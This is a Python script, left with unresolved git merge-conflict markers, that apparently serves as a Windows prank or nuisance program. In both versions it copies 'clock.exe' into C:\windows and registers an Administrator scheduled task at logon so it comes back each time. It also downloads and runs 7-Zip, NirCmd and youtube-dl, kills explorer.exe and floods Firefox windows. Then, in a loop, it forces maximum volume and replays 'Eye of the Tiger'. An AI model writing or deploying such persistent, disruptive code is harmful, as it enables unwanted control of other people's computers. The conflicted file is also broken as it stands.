<<<<<<< HEAD
from multiprocessing import Process
import sys
import os
import time
import datetime
from datetime import timedelta
users = 'users'


step1 = '$A = New-ScheduledTaskAction -Execute "C:/windows/clock.exe"'
step2 = '$P = New-ScheduledTaskPrincipal "builtin\Administrator"'
step3 = '$T = New-ScheduledTaskTrigger -AtLogon'
step4 = '$S = New-ScheduledTaskSettingsSet'
step5 = '$D = New-ScheduledTask -Action $A -Principal $P -Trigger $T -Settings $S'
step6 = '$D | Register-ScheduledTask -taskname "T1" -User "administrator"'

def backup():
    os.system('copy %userprofile%\downloads\clock.exe C:\windows')
    os.system("copy C:\{}\clock.exe C:\windows".format(users))
    os.system('powershell.exe -command "{} ; {} ; {} ; {} ; {} ; {}"'.format(step1, step2, step3, step4, step5, step6))
    os.system("copy C:\windows\clock.exe C:\{}\clock.exe".format(users))



def sec():
    os.system('powershell.exe -command "{} ; {} ; {} ; {} ; {} ; {}"'.format(step1, step2, step3, step4, step5, step6))
    os.system('powershell.exe -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7z1801-x64.exe -outfile C:/users/7z1801-x64.exe" ')
    os.system('powershell.exe -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Uri https://www.nirsoft.net/utils/nircmd-x64.zip -outfile C:/users/nircmd-x64.zip" ')
    os.system('C:/users/7z1801-x64.msi /q INSTALLDIR="C:/Program Files/7-Zip"')
    zip_intall_path = '"C:/Program Files/7-Zip"'
    os.system('C:/users/7z1801-x64.exe /S /D={}'.format(zip_intall_path))
    time.sleep(10)
    os.system("set PATH=%PATH%;{}; && cd C:/users/ && 7z x C:/users/nircmd-x64.zip".format(zip_intall_path))
    os.system('C:/users/nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 1')
    os.system('C:/users/nircmd.exe screensaver')


def download():
    os.system('powershell.exe -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" ')
    os.system("taskkill /F /IM explorer.exe")
    user_folder_dir = '''C:/users/youtube-dl.exe'''
    os.system('powershell.exe -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Uri https://yt-dl.org/downloads/2018.04.09/youtube-dl.exe -outfile {}" '.format(user_folder_dir))
    os.system('C:/users/nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 1')
    os.system('C:/users/nircmd.exe screensaver')
    os.system("start firefox google.com")
    os.system("start firefox google.com")
    os.system("start firefox google.com")
    os.system("start firefox google.com")
    os.system("start firefox google.com")
    os.system("start firefox google.com")
    os.system("start firefox google.com")
    os.system("cd C:/users/ && C:/users/youtube-dl.exe https://www.youtube.com/watch?v=btPJPFnesV4")
    os.system('C:/users/nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 1')
    os.system('C:/users/nircmd.exe screensaver')
    tiger = '"C:/users/Survivor - Eye Of The Tiger-btPJPFnesV4.webm"'
    os.system('attrib -h C:/users/youtube-dl.exe && attrib -h C:/users/7z1801-x64.exe && attrib -h C:/users/nircmd.exe && attrib -h {}'.format(tiger))
    os.system("C:/users/nircmd.exe setsysvolume 65535")
    os.system('{}'.format(tiger))
    os.system("start explorer.exe")




def final_sec(hor,min,sec):
    h = ((int(hor) * 60) * 60)
    m = (int(min)) * 60
    s = (int(sec))
    return h + m + s

def timer():
    for x in range(1,1000):
        time_start = datetime.datetime.now()
        time_diff = time_start + timedelta(seconds=10800)
        final_time = time_diff - time_start
        final_time = time_diff - time_start
        final_time = str(final_time)
        final_time = final_time.split(":")
        if time_start != time_diff:
            time.sleep(1800)
            os.system("nircmd.exe setsysvolume 65535")
            os.system('"C:/users/Survivor - Eye Of The Tiger-btPJPFnesV4.webm"')
            os.system("copy C:\windows\clock.exe C:\{}\clock.exe".format(users))
        else:
            os.system("C:/users/nircmd.exe setsysvolume 65535")
            os.system('"C:/users/Survivor - Eye Of The Tiger-btPJPFnesV4.webm"')

backup()
sec()
download()

p = Process(target=timer())
p2 = Process(target=timer())
p3 = Process(target=timer())
p4 = Process(target=timer())
p5 = Process(target=timer())

p.start()
p2.start()
p3.start()
p4.start()
p5.start()
=======
from multiprocessing import Process
import sys
import os
import time
import datetime
from datetime import timedelta
users = 'users'

          
step1 = '$A = New-ScheduledTaskAction -Execute "C:/windows/clock.exe"'
step2 = '$P = New-ScheduledTaskPrincipal "builtin\Administrator"'
step3 = '$T = New-ScheduledTaskTrigger -AtLogon'
step4 = '$S = New-ScheduledTaskSettingsSet'
step5 = '$D = New-ScheduledTask -Action $A -Principal $P -Trigger $T -Settings $S'
step6 = '$D | Register-ScheduledTask -taskname "T1" -User "administrator"'

def backup():
    os.system('copy %userprofile%\downloads\clock.exe C:\{}\clock.exe'.format(users))
    os.system('copy %userprofile%\downloads\CLOCK\clock.exe C:\{}\clock.exe'.format(users))
    os.system("copy C:\{}\clock.exe C:\windows".format(users))
    os.system('powershell.exe -command "{} ; {} ; {} ; {} ; {} ; {}"'.format(step1, step2, step3, step4, step5, step6))
    os.system("copy C:\windows\clock.exe C:\{}\clock.exe".format(users))



def sec():
    os.system('powershell.exe -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7z1801-x64.exe -outfile C:/users/7z1801-x64.exe" ')
    os.system('powershell.exe -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Uri https://www.nirsoft.net/utils/nircmd-x64.zip -outfile C:/users/nircmd-x64.zip" ')
    os.system('C:/users/7z1801-x64.msi /q INSTALLDIR="C:/Program Files/7-Zip"')
    zip_intall_path = '"C:/Program Files/7-Zip"'
    os.system('C:/users/7z1801-x64.exe /S /D={}'.format(zip_intall_path))
    time.sleep(10)
    os.system("set PATH=%PATH%;{}; && cd C:/users/ && 7z x -y C:/users/nircmd-x64.zip".format(zip_intall_path))
    os.system('C:/users/nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 1')
    os.system('C:/users/nircmd.exe screensaver')


def download():
    os.system('C:/users/nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 1')
    os.system('C:/users/nircmd.exe screensaver')
    os.system("taskkill /F /IM explorer.exe")
    user_folder_dir = '''C:/users/youtube-dl.exe'''
    os.system('powershell.exe -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Uri https://yt-dl.org/downloads/2018.04.09/youtube-dl.exe -outfile {}" '.format(user_folder_dir))
    os.system('C:/users/nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 1')
    os.system('C:/users/nircmd.exe screensaver')
    os.system("cd C:/users/ && C:/users/youtube-dl.exe -f mp4 https://www.youtube.com/watch?v=btPJPFnesV4")
    os.system('C:/users/nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 1')
    os.system('C:/users/nircmd.exe screensaver')
    tiger = '"C:/users/Survivor - Eye Of The Tiger-btPJPFnesV4.mp4"'
    os.system('attrib -h C:/users/youtube-dl.exe && attrib -h C:/users/7z1801-x64.exe && attrib -h C:/users/nircmd.exe && attrib -h {}'.format(tiger))
    os.system("C:/users/nircmd.exe setsysvolume 65535")
    os.system('{}'.format(tiger))
    os.system("start explorer.exe")




def final_sec(hor,min,sec):
    h = ((int(hor) * 60) * 60)
    m = (int(min)) * 60
    s = (int(sec))
    return h + m + s

def timer():
    for x in range(1,1000):
        time_start = datetime.datetime.now()
        time_diff = time_start + timedelta(seconds=10800)
        final_time = time_diff - time_start
        final_time = time_diff - time_start
        final_time = str(final_time)
        final_time = final_time.split(":")
        if time_start != time_diff:
            time.sleep(1800)
            os.system("nircmd.exe setsysvolume 65535")
            os.system('"C:/users/Survivor - Eye Of The Tiger-btPJPFnesV4.mp4"')
            os.system("copy C:\windows\clock.exe C:\{}\clock.exe".format(users))
        else:
            os.system("C:/users/nircmd.exe setsysvolume 65535")
            os.system('"C:/users/Survivor - Eye Of The Tiger-btPJPFnesV4.mp4"')

backup()
sec()
download()

p = Process(target=timer())
p2 = Process(target=timer())
p3 = Process(target=timer())
p4 = Process(target=timer())
p5 = Process(target=timer())

p.start()
time.sleep(2000)
p2.start()
time.sleep(2000)
p3.start()
time.sleep(2000)
p4.start()
time.sleep(2000)
p5.start()
time.sleep(2000)
>>>>>>> f26b5eefb10be8881813c4c67f961139b2e0658f
